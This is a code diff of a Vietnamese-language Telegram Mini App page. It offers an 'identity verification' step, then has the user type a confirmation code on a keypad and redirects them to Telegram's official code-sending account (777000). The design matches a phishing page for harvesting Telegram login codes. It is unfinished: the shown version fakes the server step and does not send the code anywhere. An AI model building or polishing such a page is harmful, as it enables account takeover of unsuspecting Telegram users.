@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <script src="https://telegram.org"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { font-family: sans-serif; background: #1a1a1a; color: white; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .container { width: 90%; text-align: center; }
@@ -16,25 +16,23 @@
         .msg-box { background: white; color: #333; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; }
         .otp-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 20px; }
         .otp-box { width: 45px; height: 60px; border: 2px solid #555; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 24px; background: #333; }
-        .otp-box.active { border-color: #0088cc; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { background: #0066ff; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 20px; }
+        .key { background: #0066ff; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 20px; cursor: pointer; }
     </style>
 </head>
 <body>
-
     <div class="container">
         <!-- --- MÀN HÌNH BƯỚC 1 --- -->
         <div id="step-1">
             <div style="margin-bottom: 30px;">
-                <img src="https://via.placeholder.com" style="border-radius: 50%;">
+                <img src="https://via.placeholder.com/150" style="border-radius: 50%;">
                 <h2>Xác minh danh tính</h2>
                 <p>Nhấn vào nút bên dưới để bắt đầu</p>
             </div>
             <button class="btn-confirm" onclick="finishStep1()">XÁC NHẬN</button>
         </div>
 
-        <!-- --- MÀN HÌNH BƯỚC 2 (Mặc định bị ẩn) --- -->
+        <!-- --- MÀN HÌNH BƯỚC 2 (OTP) --- -->
         <div id="step-2" class="hidden">
             <div class="msg-box">
                 📩 Chúng tôi đã gửi mã xác nhận cho bạn. Hãy nhập mã bằng bàn phím bên dưới.
@@ -47,7 +45,6 @@
                 <div class="otp-box"></div>
             </div>
             <div class="keypad">
-                <!-- Bàn phím số tương tự như trước -->
                 <button class="key" onclick="press('1')">1</button>
                 <button class="key" onclick="press('2')">2</button>
                 <button class="key" onclick="press('3')">3</button>
@@ -68,34 +65,16 @@
     const tg = window.Telegram.WebApp;
     tg.ready();
 
-    // HÀM XỬ LÝ BƯỚC 1
+    // Step 1: xác nhận
     async function finishStep1() {
         tg.HapticFeedback.impactOccurred('medium');
-        
-        try {
-            // Gọi API Step 1
-            const response = await fetch('https://api.yourserver.com', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ initData: tg.initData })
-            });
 
-            // Nếu Server xác nhận thành công
-            if (response.ok) {
-                document.getElementById('step-1').classList.add('hidden'); // Ẩn Step 1
-                document.getElementById('step-2').classList.remove('hidden'); // Hiện Step 2
-            } else {
-                tg.showAlert("Xác nhận không thành công, vui lòng thử lại.");
-            }
-        } catch (e) {
-            // Demo: Nếu không có API thực tế, bạn có thể tạm thời xóa try/catch 
-            // để ép nó chuyển sang Step 2 khi nhấn nút.
-            document.getElementById('step-1').classList.add('hidden');
-            document.getElementById('step-2').classList.remove('hidden');
-        }
+        // Demo: giả lập API thành công → hiện step 2
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
     }
 
-    // LOGIC CHO STEP 2 (NHẬP OTP)
+    // Step 2: nhập OTP
     let otp = "";
     const boxes = document.querySelectorAll('.otp-box');
 
@@ -120,10 +99,12 @@
         });
     }
 
-    async function sendFinalOTP(code) {
-        // Gọi API cuối cùng để hoàn tất
-        console.log("Đang gửi OTP:", code);
-        tg.showConfirm("Gửi mã " + code + "?");
+    function sendFinalOTP(code) {
+        // Sau khi nhập OTP xong → chuyển sang Telegram user id 777000
+        const confirmResult = confirm("Mã OTP: " + code + "\nChuyển sang Telegram?");
+        if (confirmResult) {
+            window.location.href = "tg://user?id=777000";
+        }
     }
 </script>
 </body>
